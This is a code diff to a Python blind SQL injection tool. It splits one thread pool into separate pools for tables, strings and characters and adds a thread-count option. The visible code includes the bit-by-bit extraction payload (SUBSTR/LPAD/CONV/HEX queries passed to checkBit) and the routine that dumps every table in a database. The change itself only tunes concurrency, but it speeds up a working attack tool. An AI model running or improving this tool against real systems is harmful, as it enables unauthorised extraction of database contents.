@@ -5,8 +5,11 @@ import urllib.parse, urllib.request, time, math, argparse, sys, concurrent.futur
 
 DEFAULT_DELAY=0
 
-MAX_THREADS=100
-executor = concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS)
+MAX_THREADS=50
+tableExecutor = None
+stringExecutor = None
+charExecutor = None
+
 
 class Printer:
 
@@ -81,7 +84,7 @@ class Injector:
         return self.getNumber("LENGTH((%s))" % obj)
 
     def getChar(self, obj, index):
-        binstr = ''.join(list(executor.map(
+        binstr = ''.join(list(charExecutor.map(
             (lambda x: "1" if
              self.checkBit("SUBSTR(LPAD(CONV(HEX(SUBSTR((%s), %d, 1)), 16, 2), 7, 0), %d, 1)"
                            % (obj, index, x))
@@ -91,7 +94,7 @@ class Injector:
 
     def getString(self, obj):
         namelen = self.getLen(obj)
-        name = ''.join(list(executor.map(
+        name = ''.join(list(stringExecutor.map(
             (lambda x: self.getChar(obj, x)),
             range(1, namelen+1))))
         return name
@@ -147,7 +150,7 @@ class Database:
         PRINTER.print("Getting table count...", 1)
         count = self.getTableCount()
         PRINTER.print("Counted %d tables" % count, 1)
-        self.tables.extend(list(executor.map(lambda x: self.getTable(x, populateTables), range(count))))
+        self.tables.extend(list(tableExecutor.map(lambda x: self.getTable(x, populateTables), range(count))))
 
         
 
@@ -274,6 +277,8 @@ class Parser:
         parser.add_argument('--fieldlte', nargs=2, action=TableFieldsAction, help=argparse.SUPPRESS)
         parser.add_argument('--fieldgte', nargs=2, action=TableFieldsAction, help=argparse.SUPPRESS)
 
+        parser.add_argument('-n', '--max_threads', type=int, help="Maximum number of threads to spawn. Default: %(default)s", default=MAX_THREADS)
+
         self.args = parser.parse_args()
 
     def parseOtherFields(self):
@@ -312,6 +317,10 @@ class Parser:
 
 if __name__ == '__main__':
     p = Parser()
+
+    tableExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.05), 1))
+    stringExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.2), 1))
+    charExecutor = concurrent.futures.ThreadPoolExecutor(max_workers=max(math.floor(p.args.max_threads*0.75), 1))
     
     verbosity = 0 if p.args.verbose is None else p.args.verbose
     PRINTER = Printer(verbosity, p.args.outfile)
@@ -341,4 +350,6 @@ if __name__ == '__main__':
             PRINTER.printToFile("")
         PRINTER.printToFile("")
 
-executor.shutdown()
+tableExecutor.shutdown()
+stringExecutor.shutdown()
+charExecutor.shutdown()
